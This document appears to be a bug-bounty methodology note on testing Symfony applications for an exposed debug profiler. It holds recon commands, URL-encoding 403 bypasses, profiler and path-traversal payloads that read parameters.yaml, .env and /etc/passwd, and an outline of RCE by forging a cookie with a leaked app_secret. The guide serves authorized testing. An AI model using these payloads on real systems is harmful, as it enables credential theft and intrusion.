---
title: "Symfony Security Testing"
type: technique
tags: [symfony, php, debug, profiler, rce, bypass, app-secret, framework]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[command-injection]]", "[[information-disclosure]]"]
status: active
severity_range: "MEDIUM-CRITICAL"
---

# Symfony Security Testing

## Overview

Symfony is a popular PHP framework in enterprise applications. Exposed debug configuration (`app_dev.php`, `_profiler`) allows access to sensitive configuration files, database credentials, and in some cases escalation to RCE via the `app_secret`.

## Where to look

- PHP apps with routes such as `/app_dev.php`, `/_profiler/`, `/phpinfo.php`
- PHP headers in `X-Powered-By`
- JavaScript files that reference Symfony routes (`/api/`, `/bundle/`)

## Testing methodology

### 1. Identify Symfony

```bash
# Response headers
curl -I https://target.com/ | grep -i "x-powered-by\|x-symfony\|sf-"

# Characteristic routes
curl -I https://target.com/app_dev.php
curl -I https://target.com/_profiler/
curl -I https://target.com/config.php

# Symfony-specific wordlist
# https://github.com/reewardius/bbFuzzing.txt/blob/main/bbFuzzing.txt
ffuf -w bbFuzzing.txt -u https://target.com/FUZZ -mc 200,301,302,403
```

### 2. Access the profiler

```bash
# Direct endpoint (may return 403 in production)
https://target.com/app_dev.php/_profiler/open?file=config/parameters.yaml&line=1

# Target content: database parameters, credentials, app_secret
```

### 3. Bypass 403 on the profiler

```bash
# Via URL encoding of the dot
https://target.com/app_dev%2ephp/_profiler/open?file=config/parameters.yaml&line=1

# Via reverse-proxy characters
# %2f = /
# %5c = \
# %2e = .
https://target.com/%2fapp_dev.php/_profiler/...
https://target.com/app_dev%2ephp/_profiler/...
```

### 4. Files of interest in the profiler

```
config/parameters.yaml       -> database, credentials, app_secret
config/parameters.yml        -> same (alias)
.env                         -> environment variables
config/config.yml            -> full framework configuration
app/config/parameters.yml    -> Symfony 3.x
```

## Impact escalation

### Impact 1: RCE via app_secret

```bash
# 1. Obtain app_secret via _profiler or exposed phpinfo
# app_secret is used to sign session cookies in Symfony

# 2. Forge a session cookie (Symfony 3.x/4.x)
# Use symfony-exploits or gadget chains to force deserialization

# 3. Craft a forged cookie with an RCE payload
python3 exploit.py --secret "APP_SECRET_VALUE" --payload "id"
```

### Impact 2: database credentials

```bash
# Via _profiler -> config/parameters.yaml:
# database_host, database_name, database_user, database_password

# Via analytics JavaScript files (config leakage)
# Search the app JS for references to parameters.yaml
```

## Useful payloads

```bash
# File read via profiler (path traversal)
/_profiler/open?file=../../etc/passwd&line=1
/_profiler/open?file=config/parameters.yaml&line=1
/_profiler/open?file=.env&line=1

# Exposed phpinfo
/phpinfo.php
/info.php
/test.php
```

## Tools

- `ffuf` with a Symfony route wordlist
- bbFuzzing.txt: https://github.com/reewardius/bbFuzzing.txt/blob/main/bbFuzzing.txt
- HTTP proxy for cookie manipulation

## Impact examples

| Exposure | Impact | Severity |
|-----------|---------|-----------|
| `_profiler` accessible | Read config/parameters.yaml | High |
| `app_secret` exposed | Cookie forging -> possible RCE | Critical |
| DB credentials | Database access | High-Critical |
| `app_dev.php` exposed | Full debug info | Medium-High |

## Report tips

- Report `_profiler` access even without escalation, it is already High for configuration exposure
- If you obtained `app_secret`, demonstrate the forged cookie signature as PoC (without executing RCE)
- DB credentials = Critical
- Note the Symfony version if visible (it determines the available gadget chains)

## References

- Symfony security documentation
